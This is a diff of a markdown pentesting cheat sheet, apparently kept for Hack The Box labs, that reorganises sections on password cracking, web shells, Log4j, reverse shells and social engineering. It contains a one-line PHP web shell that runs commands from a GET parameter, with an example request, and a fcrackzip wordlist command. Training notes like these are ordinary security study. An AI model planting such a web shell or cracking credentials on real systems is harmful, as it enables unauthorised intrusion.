@@ -197,9 +197,15 @@ conncet using cert and priv key:
 
 
 # Cracking
+## Crack ssh ftp mysql users using wordlists:
+cme ->Crackmapexec
+
+## FTP
+### Test ftp user wordlist using hydra:
+![image](https://user-images.githubusercontent.com/19478700/211882774-b0a7dab7-2da4-4195-a7e9-230ce8a87c34.png)
 
 
-Cracking zips:
+## Zips:
 fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
 
 
@@ -230,27 +236,24 @@ https://github.com/antonioCoco/ConPtyShell
 shell.php:
 ```php
 <?php system($_GET["cmd"]); ?>
-``
+``` 
 http://thetoppers.htb/shell.php?cmd=id
 The response from the server contains the output of the OS command id
 
-# Dictionary Generation
-```s
-cewl
-```
-#Test ftp user wordlist using hydra:
-![image](https://user-images.githubusercontent.com/19478700/211882774-b0a7dab7-2da4-4195-a7e9-230ce8a87c34.png)
 
-#Crack ssh ftp mysql users using wordlists:
-cme ->Crackmapexec
 
-# Log4j
+## Log4j
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Log4Shell.md
 
-# Reverse Shell Generator
+## Reverse Shell Generator
 https://www.revshells.com
 
 # Social Engineering
 ## Emails from console
 ![image](https://user-images.githubusercontent.com/19478700/214691713-035aa13f-7199-46d4-94b8-bebba78af555.png)
+
+# Dictionary Generation
+```s
+cewl
+```
 
